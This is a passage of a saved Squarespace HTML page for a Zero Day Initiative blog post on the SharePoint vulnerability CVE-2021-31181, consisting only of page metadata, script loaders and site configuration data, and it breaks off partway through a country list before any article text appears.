<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" lang="en-US" class="yui3-js-enabled js flexbox canvas canvastext webgl no-touch hashchange history draganddrop rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms no-csstransforms3d csstransitions video audio svg inlinesvg svgclippaths" style="" id="yui_3_17_2_1_1762949685278_102"><div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important"></div><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <meta name="viewport" content="width=device-width,initial-scale=1">
    
    <link href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/css" rel="stylesheet">
    <link href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/icon" rel="stylesheet">
    <!-- This is Squarespace. --><!-- brian-gorenc -->
<!--<base href="">--><base href=".">

<title>Zero Day Initiative — CVE-2021-31181: Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability</title>
<meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model"><link rel="icon" type="image/x-icon" href="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1487670157237-HOXHMI54TA0SZP21OY7C/favicon.ico">
<link rel="canonical" href="https://www.thezdi.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability">
<meta property="og:site_name" content="Zero Day Initiative">
<meta property="og:title" content="Zero Day Initiative — CVE-2021-31181: Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability">
<meta property="og:latitude" content="40.7207559">
<meta property="og:longitude" content="-74.0007613">
<meta property="og:locality" content="">
<meta property="og:url" content="https://www.thezdi.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability">
<meta property="og:type" content="article">
<meta property="og:description" content="In May of 2021, Microsoft released a patch to correct  CVE-2021-31181  – a remote code execution bug in the supported versions of Microsoft SharePoint Server. This bug was reported to the ZDI program by an anonymous researcher and is also known as  ZDI-21-573 . This blog takes a deeper look at the r">
<meta property="og:image" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/60b68fccb9f90c6ec8c02fe8/1622648131186/branch-sky-sunlight-construction-pattern-line-1346600-pxhere.com.jpg?format=1500w">
<meta property="og:image:width" content="1280">
<meta property="og:image:height" content="853">
<meta itemprop="name" content="Zero Day Initiative — CVE-2021-31181: Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability">
<meta itemprop="url" content="https://www.thezdi.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability">
<meta itemprop="description" content="In May of 2021, Microsoft released a patch to correct  CVE-2021-31181  – a remote code execution bug in the supported versions of Microsoft SharePoint Server. This bug was reported to the ZDI program by an anonymous researcher and is also known as  ZDI-21-573 . This blog takes a deeper look at the r">
<meta itemprop="thumbnailUrl" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/60b68fccb9f90c6ec8c02fe8/1622648131186/branch-sky-sunlight-construction-pattern-line-1346600-pxhere.com.jpg?format=1500w">
<link rel="image_src" href="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/60b68fccb9f90c6ec8c02fe8/1622648131186/branch-sky-sunlight-construction-pattern-line-1346600-pxhere.com.jpg?format=1500w">
<meta itemprop="image" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/60b68fccb9f90c6ec8c02fe8/1622648131186/branch-sky-sunlight-construction-pattern-line-1346600-pxhere.com.jpg?format=1500w">
<meta itemprop="author" content="The ZDI Research Team">
<meta itemprop="datePublished" content="2021-06-02T10:35:31-0500">
<meta itemprop="dateModified" content="2021-06-02T10:35:31-0500">
<meta itemprop="headline" content="CVE-2021-31181: Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability">
<meta itemprop="publisher" content="Zero Day Initiative">
<meta name="twitter:title" content="Zero Day Initiative — CVE-2021-31181: Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability">
<meta name="twitter:image" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/60b68fccb9f90c6ec8c02fe8/1622648131186/branch-sky-sunlight-construction-pattern-line-1346600-pxhere.com.jpg?format=1500w">
<meta name="twitter:url" content="https://www.thezdi.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability">
<meta name="twitter:card" content="summary">
<meta name="twitter:description" content="In May of 2021, Microsoft released a patch to correct  CVE-2021-31181  – a remote code execution bug in the supported versions of Microsoft SharePoint Server. This bug was reported to the ZDI program by an anonymous researcher and is also known as  ZDI-21-573 . This blog takes a deeper look at the r">
<meta name="description" content="">
<link rel="preconnect" href="https://images.squarespace-cdn.com/">
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
<link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/css2"><script type="text/javascript" async="" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/analytics.js.download"></script><script type="text/javascript" async="" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/js"></script><script type="text/javascript" crossorigin="anonymous" nomodule="nomodule" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/legacy.js.download"></script>
<script type="text/javascript" crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/modern.js.download"></script>
<script type="text/javascript">SQUARESPACE_ROLLUPS = {};</script>
<script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-d75ad899ad99b3d3-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_runtime');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/extract-css-runtime-d75ad899ad99b.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-6f2a1f6ec9a41489-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_moment_js_vendor');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/extract-css-moment-js-vendor-6f2a.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-22ed584d99d9b83d-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-cldr_resource_pack');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/cldr-resource-pack-22ed584d99d9b8.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-fbd854d40b0804b7-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors_stable');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/common-vendors-stable-fbd854d40b0.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-8a7cfb65d43b8de5-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/common-vendors-8a7cfb65d43b8de5-m.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-516d0834eb415d94-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/common-516d0834eb415d94-min.en-US.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/user-account-core-c4220b44c6951cc5-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-user_account_core');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/user-account-core-c4220b44c6951cc.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].css = ["//assets.squarespace.com/universal/styles-compressed/user-account-core-89dabefb87591b1e-min.en-US.css"]; })(SQUARESPACE_ROLLUPS, 'squarespace-user_account_core');</script>
<link rel="stylesheet" type="text/css" href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/user-account-core-89dabefb87591b1e-min.css"><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/performance-45cdefef297be205-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-performance');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/performance-45cdefef297be205-min..download" defer=""></script><script data-name="static-context">Static = window.Static || {}; Static.SQUARESPACE_CONTEXT = {"betaFeatureFlags":["campaigns_merch_state","marketing_automations","marketing_landing_page","order_status_page_checkout_landing_enabled","campaigns_import_discounts","campaigns_discount_section_in_blasts","campaigns_new_image_layout_picker","campaigns_discount_section_in_automations","campaigns_thumbnail_layout","contacts_and_campaigns_redesign","enable_form_submission_trigger","use_react_flow_in_automations_flowchart","bfcm_2025_enabled","i18n_beta_website_locales"],"facebookAppId":"314192535267336","facebookApiVersion":"v6.0","rollups":{"squarespace-announcement-bar":{"js":"//assets.squarespace.com/universal/scripts-compressed/announcement-bar-bc29aabcad9b0321-min.en-US.js"},"squarespace-audio-player":{"css":"//assets.squarespace.com/universal/styles-compressed/audio-player-b05f5197a871c566-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/audio-player-e160d216aed116bb-min.en-US.js"},"squarespace-blog-collection-list":{"css":"//assets.squarespace.com/universal/styles-compressed/blog-collection-list-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/blog-collection-list-f78db80fc1cd6fce-min.en-US.js"},"squarespace-calendar-block-renderer":{"css":"//assets.squarespace.com/universal/styles-compressed/calendar-block-renderer-b72d08ba4421f5a0-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/calendar-block-renderer-182e89e126289b13-min.en-US.js"},"squarespace-chartjs-helpers":{"css":"//assets.squarespace.com/universal/styles-compressed/chartjs-helpers-96b256171ee039c1-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/chartjs-helpers-4fd57f343946d08e-min.en-US.js"},"squarespace-comments":{"css":"//assets.squarespace.com/universal/styles-compressed/comments-d47e61fe47b5ff82-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/comments-0f751aea9339e89c-min.en-US.js"},"squarespace-custom-css-popup":{"css":"//assets.squarespace.com/universal/styles-compressed/custom-css-popup-89143d073173c3e0-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/custom-css-popup-5177f6aaf8a61cab-min.en-US.js"},"squarespace-dialog":{"css":"//assets.squarespace.com/universal/styles-compressed/dialog-f9093f2d526b94df-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/dialog-5abd3585de282bb5-min.en-US.js"},"squarespace-events-collection":{"css":"//assets.squarespace.com/universal/styles-compressed/events-collection-b72d08ba4421f5a0-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/events-collection-5fa01fd523721c94-min.en-US.js"},"squarespace-form-rendering-utils":{"js":"//assets.squarespace.com/universal/scripts-compressed/form-rendering-utils-dea9bf383ee1a39c-min.en-US.js"},"squarespace-forms":{"css":"//assets.squarespace.com/universal/styles-compressed/forms-0afd3c6ac30bbab1-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/forms-3293f203da904154-min.en-US.js"},"squarespace-gallery-collection-list":{"css":"//assets.squarespace.com/universal/styles-compressed/gallery-collection-list-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/gallery-collection-list-07747667a3187b76-min.en-US.js"},"squarespace-image-zoom":{"css":"//assets.squarespace.com/universal/styles-compressed/image-zoom-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/image-zoom-60c18dc5f8f599ea-min.en-US.js"},"squarespace-pinterest":{"css":"//assets.squarespace.com/universal/styles-compressed/pinterest-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/pinterest-2fa208f4b63c95af-min.en-US.js"},"squarespace-popup-overlay":{"css":"//assets.squarespace.com/universal/styles-compressed/popup-overlay-b742b752f5880972-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/popup-overlay-904ea14ca76293f9-min.en-US.js"},"squarespace-product-quick-view":{"css":"//assets.squarespace.com/universal/styles-compressed/product-quick-view-9052fb446c5800ee-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/product-quick-view-73a41171b1c96185-min.en-US.js"},"squarespace-products-collection-item-v2":{"css":"//assets.squarespace.com/universal/styles-compressed/products-collection-item-v2-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/products-collection-item-v2-e3a3f101748fca6e-min.en-US.js"},"squarespace-products-collection-list-v2":{"css":"//assets.squarespace.com/universal/styles-compressed/products-collection-list-v2-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/products-collection-list-v2-eedc544f4cc56af4-min.en-US.js"},"squarespace-search-page":{"css":"//assets.squarespace.com/universal/styles-compressed/search-page-90a67fc09b9b32c6-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/search-page-7d8afa9eb5e09a2d-min.en-US.js"},"squarespace-search-preview":{"js":"//assets.squarespace.com/universal/scripts-compressed/search-preview-21194fc3d3addc8e-min.en-US.js"},"squarespace-simple-liking":{"css":"//assets.squarespace.com/universal/styles-compressed/simple-liking-701bf8bbc05ec6aa-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/simple-liking-e6bc64da9e3b1cf4-min.en-US.js"},"squarespace-social-buttons":{"css":"//assets.squarespace.com/universal/styles-compressed/social-buttons-95032e5fa98e47a5-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/social-buttons-81b2f14e6410778c-min.en-US.js"},"squarespace-tourdates":{"css":"//assets.squarespace.com/universal/styles-compressed/tourdates-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/tourdates-ebc8e4d29314c4fd-min.en-US.js"},"squarespace-website-overlays-manager":{"css":"//assets.squarespace.com/universal/styles-compressed/website-overlays-manager-07ea5a4e004e6710-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/website-overlays-manager-c044e70cefe65977-min.en-US.js"}},"pageType":50,"website":{"id":"5894c269e4fcb5e65a1ed623","identifier":"brian-gorenc","websiteType":1,"contentModifiedOn":1755108158609,"cloneable":false,"hasBeenCloneable":false,"developerMode":true,"siteStatus":{},"language":"en-US","translationLocale":"en-US","formattingLocale":"en-US","timeZone":"America/Chicago","machineTimeZoneOffset":-21600000,"timeZoneOffset":-21600000,"timeZoneAbbr":"CST","siteTitle":"Zero Day Initiative","fullSiteTitle":"Zero Day Initiative \u2014 CVE-2021-31181: Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability","siteDescription":"","location":{},"shareButtonOptions":{"2":true,"6":true,"1":true,"4":true,"3":true},"authenticUrl":"https://www.thezdi.com","internalUrl":"https://brian-gorenc.squarespace.com","baseUrl":"https://www.thezdi.com","primaryDomain":"www.thezdi.com","sslSetting":3,"isHstsEnabled":true,"socialAccounts":[{"serviceId":11,"userId":"UChbH7B5YhXANmlMYJRHpw0g","screenname":"TippingPoint Zero Day Initiative","addedOn":1492722141068,"profileUrl":"https://www.youtube.com/channel/UChbH7B5YhXANmlMYJRHpw0g","iconUrl":"https://yt3.ggpht.com/-5tyoeQlg_Jk/AAAAAAAAAAI/AAAAAAAAAAA/lrjg7w8bQgA/s88-c-k-no-mo-rj-c0xffffff/photo.jpg","iconEnabled":true,"serviceName":"youtube"}],"typekitId":"","statsMigrated":false,"imageMetadataProcessingEnabled":false,"screenshotId":"a0a901f81f08cc6c7c9e5108d43c513fa4847e74de2b39c335909e3f8dd88d34","captchaSettings":{"enabledForDonations":false},"showOwnerLogin":false},"websiteSettings":{"id":"5894c269e4fcb5e65a1ed625","websiteId":"5894c269e4fcb5e65a1ed623","subjects":[],"country":"US","state":"TX","simpleLikingEnabled":true,"mobileInfoBarSettings":{"isContactEmailEnabled":false,"isContactPhoneNumberEnabled":false,"isLocationEnabled":false,"isBusinessHoursEnabled":false},"commentLikesAllowed":true,"commentAnonAllowed":true,"commentThreaded":true,"commentApprovalRequired":false,"commentAvatarsOn":true,"commentSortType":2,"commentFlagThreshold":0,"commentFlagsAllowed":true,"commentEnableByDefault":true,"commentDisableAfterDaysDefault":0,"disqusShortname":"","commentsEnabled":false,"contactPhoneNumber":"","storeSettings":{"returnPolicy":null,"termsOfService":null,"privacyPolicy":null,"expressCheckout":false,"continueShoppingLinkUrl":"/","useLightCart":false,"showNoteField":false,"shippingCountryDefaultValue":"US","billToShippingDefaultValue":false,"showShippingPhoneNumber":true,"isShippingPhoneRequired":false,"showBillingPhoneNumber":true,"isBillingPhoneRequired":false,"currenciesSupported":["CHF","HKD","MXN","EUR","DKK","USD","CAD","MYR","NOK","THB","AUD","SGD","ILS","PLN","GBP","CZK","SEK","NZD","PHP","RUB"],"defaultCurrency":"USD","selectedCurrency":"USD","measurementStandard":1,"showCustomCheckoutForm":false,"checkoutPageMarketingOptInEnabled":false,"enableMailingListOptInByDefault":false,"sameAsRetailLocation":false,"merchandisingSettings":{"scarcityEnabledOnProductItems":false,"scarcityEnabledOnProductBlocks":false,"scarcityMessageType":"DEFAULT_SCARCITY_MESSAGE","scarcityThreshold":10,"multipleQuantityAllowedForServices":true,"restockNotificationsEnabled":false,"restockNotificationsSuccessText":"","restockNotificationsMailingListSignUpEnabled":false,"relatedProductsEnabled":false,"relatedProductsOrdering":"random","soldOutVariantsDropdownDisabled":false,"productComposerOptedIn":false,"productComposerABTestOptedOut":false,"productReviewsEnabled":false,"displayImportedProductReviewsEnabled":false,"hasOptedToCollectNativeReviews":false},"minimumOrderSubtotalEnabled":false,"minimumOrderSubtotal":{"currency":"USD","value":"0.00"},"isLive":false,"multipleQuantityAllowedForServices":true},"useEscapeKeyToLogin":true,"ssBadgeType":1,"ssBadgePosition":4,"ssBadgeVisibility":1,"ssBadgeDevices":1,"pinterestOverlayOptions":{"mode":"disabled"},"userAccountsSettings":{"loginAllowed":false,"signupAllowed":false}},"cookieSettings":{"isCookieBannerEnabled":false,"isRestrictiveCookiePolicyEnabled":false,"cookieBannerText":"","cookieBannerTheme":"","cookieBannerVariant":"","cookieBannerPosition":"","cookieBannerCtaVariant":"","cookieBannerCtaText":"","cookieBannerAcceptType":"OPT_IN","cookieBannerOptOutCtaText":"","cookieBannerHasOptOut":false,"cookieBannerHasManageCookies":true,"cookieBannerManageCookiesLabel":"","cookieBannerSavedPreferencesText":"","cookieBannerSavedPreferencesLayout":"PILL"},"websiteCloneable":false,"collection":{"title":"Blog","id":"58a5b38cb3db2bd67b608658","fullUrl":"/blog","type":1,"permissionType":1},"item":{"title":"CVE-2021-31181: Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability","id":"60b68fccb9f90c6ec8c02fe8","fullUrl":"/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability","publicCommentCount":0,"commentState":2,"recordType":1},"subscribed":false,"appDomain":"squarespace.com","templateTweakable":true,"tweakJSON":{"aspect-ratio":"Auto","bg-image":"{background-image:url(\"https://static1.squarespace.com/static/56cb6c0001dbae33a8227531/t/56ccdc64cf80a1db151ed7dd/1456266340825/cocktail-bw.jpg\");background-position:center center;background-size:cover;background-attachment:scroll;background-repeat:no-repeat}","gallery-arrow-style":"No Background","gallery-aspect-ratio":"3:2 Standard","gallery-auto-crop":"true","gallery-autoplay":"false","gallery-design":"Slideshow","gallery-info-overlay":"Show on Hover","gallery-loop":"false","gallery-navigation":"Bullets","gallery-show-arrows":"true","gallery-transitions":"Fade","galleryArrowBackground":"rgba(34,34,34,1)","galleryArrowColor":"rgba(255,255,255,1)","galleryAutoplaySpeed":"3","galleryCircleColor":"rgba(255,255,255,1)","galleryInfoBackground":"rgba(0, 0, 0, .7)","galleryThumbnailSize":"100px","gridSize":"350px","gridSpacing":"20px","product-gallery-auto-crop":"true","product-image-auto-crop":"true","tweak-v1-related-products-title-spacing":"50px"},"templateId":"67aa61355065f439ea56543f","templateVersion":"7","pageFeatures":[1,2,4],"gmRenderKey":"QUl6YVN5Q0JUUk9xNkx1dkZfSUUxcjQ2LVQ0QWVUU1YtMGQ3bXk4","templateScriptsRootUrl":"https://static1.squarespace.com/static/ta/5894c269e4fcb5e65a1ed623/33/scripts/","impersonatedSession":false,"tzData":{"zones":[[-360,"US","C%sT",null]],"rules":{"US":[[1967,2006,null,"Oct","lastSun","2:00","0","S"],[1987,2006,null,"Apr","Sun>=1","2:00","1:00","D"],[2007,"max",null,"Mar","Sun>=8","2:00","1:00","D"],[2007,"max",null,"Nov","Sun>=1","2:00","0","S"]]}},"showAnnouncementBar":false,"recaptchaEnterpriseContext":{"recaptchaEnterpriseSiteKey":"6LdDFQwjAAAAAPigEvvPgEVbb7QBm-TkVJdDTlAv"},"i18nContext":{"timeZoneData":{"id":"America/Chicago","name":"Central Time"}},"env":"PRODUCTION","visitorFormContext":{"formFieldFormats":{"initialPhoneFormat":{"id":0,"type":"PHONE_NUMBER","country":"US","labelLocale":"en-US","fields":[{"type":"SEPARATOR","label":"(","identifier":"LeftParen","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"1","identifier":"1","length":3,"required":false,"metadata":{}},{"type":"SEPARATOR","label":")","identifier":"RightParen","length":0,"required":false,"metadata":{}},{"type":"SEPARATOR","label":" ","identifier":"Space","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"2","identifier":"2","length":3,"required":false,"metadata":{}},{"type":"SEPARATOR","label":"-","identifier":"Dash","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"3","identifier":"3","length":14,"required":false,"metadata":{}}]},"initialNameOrder":"GIVEN_FIRST","initialAddressFormat":{"id":0,"type":"ADDRESS","country":"US","labelLocale":"en","fields":[{"type":"FIELD","label":"Address Line 1","identifier":"Line1","length":0,"required":true,"metadata":{"autocomplete":"address-line1"}},{"type":"SEPARATOR","label":"\n","identifier":"Newline","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"Address Line 2","identifier":"Line2","length":0,"required":false,"metadata":{"autocomplete":"address-line2"}},{"type":"SEPARATOR","label":"\n","identifier":"Newline","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"City","identifier":"City","length":0,"required":true,"metadata":{"autocomplete":"address-level2"}},{"type":"SEPARATOR","label":",","identifier":"Comma","length":0,"required":false,"metadata":{}},{"type":"SEPARATOR","label":" ","identifier":"Space","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"State","identifier":"State","length":0,"required":true,"metadata":{"autocomplete":"address-level1"}},{"type":"SEPARATOR","label":" ","identifier":"Space","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"ZIP Code","identifier":"Zip","length":0,"required":true,"metadata":{"autocomplete":"postal-code"}}]},"countries":[{"name":"Afghanistan","code":"AF","phoneCode":"+93"},{"name":"\u00C5land Islands","code":"AX","phoneCode":"+358"},{"name":"Albania","code":"AL","phoneCode":"+355"},{"name":"Algeria","code":"DZ","phoneCode":"+213"},{"name":"American Samoa","code":"AS","phoneCode":"+1"},{"name":"Andorra","code":"AD","phoneCode":"+376"},{"name":"Angola","code":"AO","phoneCode":"+244"},{"name":"Anguilla","code":"AI","phoneCode":"+1"},{"name":"Antigua & Barbuda","code":"AG","phoneCode":"+1"},{"name":"Argentina","code":"AR","phoneCode":"+54"},{"name":"Armenia","code":"AM","phoneCode":"+374"},{"name":"Aruba","code":"AW","phoneCode":"+297"},{"name":"Ascension Island","code":"AC","phoneCode":"+247"},{"name":"Australia","code":"AU","phoneCode":"+61"},{"name":"Austria","code":"AT","phoneCode":"+43"},{"name":"Azerbaijan","code":"AZ","phoneCode":"+994"},{"name":"Bahamas","code":"BS","phoneCode":"+1"},{"name":"Bahrain","code":"BH","phoneCode":"+973"},{"name":"Bangladesh","code":"BD","phoneCode":"+880"},{"name":"Barbados","code":"BB","phoneCode":"+1"},{"name":"Belarus","code":"BY","phoneCode":"+375"},{"name":"Belgium","code":"BE","phoneCode":"+32"},{"name":"Belize","code":"BZ","phoneCode":"+501"},{"name":"Benin","code":"BJ","phoneCode":"+229"},{"name":"Bermuda","code":"BM","phoneCode":"+1"},{"name":"Bhutan","code":"BT","phoneCode":"+975"},{"name":"Bolivia","code":"BO","phoneCode":"+591"},{"name":"Bosnia & Herzegovina","code":"BA","phoneCode":"+387"},{"name":"Botswana","code":"BW","phoneCode":"+267"},{"name":"Brazil","code":"BR","phoneCode":"+55"},{"name":"British Indian Ocean Territory","code":"IO","phoneCode":"+246"},{"name":"British Virgin Islands","code":"VG","phoneCode":"+1"},{"name":"Brunei","code":"BN","phoneCode":"+673"},{"name":"Bulgaria","code":"BG","phoneCode":"+359"},{"name":"Burkina Faso","code":"BF","phoneCode":"+226"},{"name":"Burundi","code":"BI","phoneCode":"+257"},{"name":"Cambodia","code":"KH","phoneCode":"+855"},{"name":"Cameroon","code":"CM","phoneCode":"+237"},{"name":"Canada","code":"CA","phoneCode":"+1"},{"name":"Cape Verde","code":"CV","phoneCode":"+238"},{"name":"Caribbean Netherlands","code":"BQ","phoneCode":"+599"},{"name":"Cayman Islands","code":"KY","phoneCode":"+1"},{"name":"Central African Republic","code":"CF","phoneCode":"+236"},{"name":"Chad","code":"TD","phoneCode":"+235"},{"name":"Chile","code":"CL","phoneCode":"+56"},{"name":"China","code":"CN","phoneCode":"+86"},{"name":"Christmas Island","code":"CX","phoneCode":"+61"},{"name":"Cocos (Keeling) Islands","code":"CC","phoneCode":"+61"},{"name":"Colombia","code":"CO","phoneCode":"+57"},{"name":"Comoros","code":"KM","phoneCode":"+269"},{"name":"Congo - Brazzaville","code":"CG","phoneCode":"+242"},{"name":"Congo - Kinshasa","code":"CD","phoneCode":"+243"},{"name":"Cook Islands","code":"CK","phoneCode":"+682"},{"name":"Costa Rica","code":"CR","phoneCode":"+506"},{"name":"C\u00F4te d\u2019Ivoire","code":"CI","phoneCode":"+225"},{"name":"Croatia","code":"HR","phoneCode":"+385"},{"name":"Cuba","code":"CU","phoneCode":"+53"},{"name":"Cura\u00E7ao","code":"CW","phoneCode":"+599"},{"name":"Cyprus","code":"CY","phoneCode":"+357"},{"name":"Czechia","code":"CZ","phoneCode":"+420"},{"name":"Denmark","code":"DK","phoneCode":"+45"},{"name":"Djibouti","code":"DJ","phoneCode":"+253"},{"name":"Dominica","code":"DM","phoneCode":"+1"},{"name":"Dominican Republic","code":"DO","phoneCode":"+1"},{"name":"Ecuador","code":"EC","phoneCode":"+593"},{"name":"Egypt","code":"EG","phoneCode":"+20"},{"name":"El Salvador","code":"SV","phoneCode":"+503"},{"name":"Equatorial Guinea","code":"GQ","phoneCode":"+240"},{"name":"Eritrea","code":"ER","phoneCode":"+291"},{"name":"Estonia","code":"EE","phoneCode":"+372"},{"name":"Eswatini","code":"SZ","phoneCode":"+268"},{"name":"Ethiopia","code":"ET","phoneCode":"+251"},{"name":"Falkland Islands","code":"FK","phoneCode":"+500"},{"name":"Faroe Islands","code":"FO","phoneCode":"+298"},{"name":"Fiji","code":"FJ","phoneCode":"+679"},{"name":"Finland","code":"FI","phoneCode":"+358"},{"name":"France","code":"FR","phoneCode":"+33"},{"name":"French Guiana","code":"GF","phoneCode":"+594"},{"name":"French 